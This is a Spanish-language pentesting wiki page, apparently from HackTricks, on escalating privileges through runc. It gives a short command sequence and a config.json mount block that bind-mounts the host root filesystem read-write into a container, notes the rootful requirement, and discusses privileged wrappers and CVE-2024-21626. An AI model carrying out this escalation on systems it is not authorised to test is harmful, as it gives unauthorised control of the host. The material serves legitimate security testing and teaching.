# Escalada de privilegios de RunC

{{#include ../../banners/hacktricks-training.md}}

## Información básica

Si quieres aprender más sobre **runc**, consulta la siguiente página:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Si `runc` está disponible para un proceso rootful en el host, puedes usar un OCI bundle cuya configuración de montaje monte recursivamente mediante bind el `/` del host en `/` dentro del contenedor, exponiendo el sistema de archivos del host en ese mount namespace.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> El flujo de trabajo documentado de `runc run` es rootful: los propios ejemplos de runc lo etiquetan como «run as root». Un usuario sin privilegios necesita una configuración rootless, como `runc spec --rootless`, y runc documenta que los user namespaces deben estar habilitados para ese modo.<sup>[[1]](#references)</sup>

## Wrappers privilegiados y versiones del runtime

Un wrapper privilegiado que acepta un bundle OCI controlado por quien lo invoca puede exponer archivos del host si permite bind mounts inseguros. Comprueba si el wrapper resuelve los traversal y los symlinks antes de validar las fuentes y los destinos de los mounts, y si restringe `process.cwd`. Una regla de sudo o un `config.json` modificable, por sí solos, no demuestran que el wrapper acepte el bundle ni que lo ejecute con privilegios del host.

Por separado, [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv) afectó a las versiones upstream de `runc` desde la `1.0.0-rc93` hasta la `1.1.11`; la `1.1.12` incluye la corrección upstream. Los file descriptors filtrados y una validación insuficiente del directorio de trabajo podían situar un proceso del contenedor fuera de su root durante ciertos flujos de trabajo de `runc run` o `runc exec`. Los números de file descriptors dependen de la invocación, y una cadena de versión no demuestra que sea explotable si un proveedor ha aplicado correcciones retroactivas o quien invoca no puede influir en una invocación privilegiada del runtime.

## References

- [1] [runc: herramienta CLI para crear y ejecutar contenedores](https://github.com/opencontainers/runc#using-runc)
- [2] [Especificación del runtime OCI: mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Subárboles compartidos](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
